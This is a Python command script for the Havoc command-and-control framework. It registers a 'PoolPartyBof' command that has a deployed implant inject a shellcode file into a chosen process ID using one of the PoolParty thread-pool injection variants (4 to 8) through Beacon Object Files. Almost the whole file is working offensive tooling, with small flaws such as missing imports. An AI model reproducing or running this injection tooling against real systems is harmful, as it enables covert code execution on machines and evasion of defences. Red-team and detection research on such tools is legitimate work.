from havoc import Demon, RegisterCommand


def PoolParty(demonID, *param):
    TaskID: str = None
    demon: Demon = None
    packer : Packer = Packer()

    pid: int = 0
    Varient: int = 0
    Shellcode: bytes = b''

    demon = Demon(demonID)

    if len(param) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Not enough arguments {len(param)}")
        return False

    if len(param) > 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Too many arguments")
        return False

    pid = int(param[0])
    shellcodeFile = param[1]
    Varient = int(param[2])

    Shellcode = open(shellcodeFile, 'rb').read()
    if exists(shellcodeFile) is False:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"File containing shellcode not found: {shellcodeFile}")
        return False
    else:
        Shellcode = open(shellcodeFile, 'rb').read()
        if len(Shellcode) == 0:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Shellcode is empty.")
            return False

    objectFile = ""
    if Varient == 4:
        objectFile = "PoolPartyBof_V4.x64.o"
    elif Varient == 5:
        objectFile = "PoolPartyBof_V5.x64.o"
    elif Varient == 6:
        objectFile = "PoolPartyBof_V6.x64.o"
    elif Varient == 7:
        objectFile = "PoolPartyBof_V7.x64.o"
    elif Varient == 8:
        objectFile = "PoolPartyBof_V8.x64.o"
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Supply Varient [4-8]: {shellcodeFile}")
        return False

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to execute {shellcodeFile}, with {Varient}th Varient.")


    packer.addint(pid)
    packer.addbytes(Shellcode)

    demon.InlineExecute(TaskID, "go", objectFile, packer.getbuffer(),
                        False)

    return TaskID

RegisterCommand(PoolParty, "", "PoolPartyBof", "Execute shellcode.", 0, "[PID] [/PATH/TO/SHELLCODE] [VARIENT]", "1234 /tmp/shellcode.bin 8" )
